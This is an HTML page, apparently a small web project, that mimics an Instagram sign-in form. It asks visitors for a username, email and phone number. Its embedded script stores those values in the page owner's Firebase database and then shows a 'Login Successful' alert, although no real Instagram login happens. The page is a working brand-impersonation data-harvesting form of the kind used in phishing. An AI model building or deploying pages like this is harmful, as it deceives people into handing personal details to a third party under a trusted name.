<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="src/output.css">

</head>
<body>
  <!-- <div class="bg-pink-500"> -->
    <div class="bg-pink-600 flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
      <div class=" bg-black rounded-t-lg pt-10 px-10 sm:mx-auto sm:w-full sm:max-w-sm">
        <img class="mx-auto h-12 w-auto" src="./src/Assets/ig2.png" alt="Your Company">
        <h2 class=" bg-black px-10 mt-10 text-white text-center text-2xl font-bold leading-9 tracking-tight text-gray-900">Sign In to Instagram</h2>
      </div>
    
      <div class=" bg-black rounded-b-lg text-white py-10 px-10 sm:mx-auto sm:w-full sm:max-w-sm">
        <form class="space-y-6" action="#" method="POST">

          <div>
            <label for="username" class="block text-white text-sm font-medium leading-6 text-gray-900">Username</label>
            <div class="mt-2">
              <input id="username" name="username" type="text" id="username" required class="px-2 block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6">
            </div>
          </div>


          <div>
            <label for="email" class="text-white block text-sm font-medium leading-6 text-gray-900">Email address</label>
            <div class="mt-2">
              <input id="email" name="email" type="email" autocomplete="email" required class=" px-2 block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6">
            </div>
          </div>
    
          <div>
            <!-- <div class="flex items-center justify-between"> -->
              <label for="phone" class="text-white block text-sm font-medium leading-6 text-gray-900">Phone Number</label>
              <!-- <div class="text-sm">
                <a href="#" class="font-semibold text-indigo-600 hover:text-indigo-500">Forgot password?</a>
              </div> -->
            <!-- </div> -->
            <div class="mt-2">
              <input id="phone" name="phone" type="number" required class="px-2 block w-full rounded-md border-0 py-1.5 text-gray-900 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6">
            </div>
          </div>
    
          <div>
            <button type="submit" id="submit" class="flex w-full justify-center rounded-md bg-pink-600 px-3 py-1.5 text-sm font-semibold leading-6 text-white shadow-sm hover:bg-pink-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600">Sign in</button>
          </div>
        </form>
    
        <p class="mt-10 text-center text-sm text-white-300">
          Not a member?
          <a href="#" class="font-semibold leading-6 text-pink-600 hover:text-pink-500">Start a 14 day free trial</a>
        </p>
      </div>
    </div>
  <!-- </div> -->
    <script type="module">
      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
      import { getDatabase,ref,set ,get,child} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

      const firebaseConfig = {
      apiKey: "AIzaSyB7U7Wh1AAPwHs1pjxCHtv6NGchgPqtI1A",
      authDomain: "simplelogin-b72fd.firebaseapp.com",
      projectId: "simplelogin-b72fd",
      storageBucket: "simplelogin-b72fd.appspot.com",
      messagingSenderId: "57391818016",
      appId: "1:57391818016:web:ad69163525c96e6b77a345"
      };

      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);
      document.getElementById("submit").addEventListener('click',function(e){
          e.preventDefault();
          set(ref(db, 'user/' + document.getElementById("username").value),
          {
              Username: document.getElementById("username").value,
              Email: document.getElementById("email").value,
              PhoneNumber: document.getElementById("phone").value,
          })
          alert("Login Successful")
      })

    </script>
    <!-- <script src="script.js"></script> -->
</body>
</html>
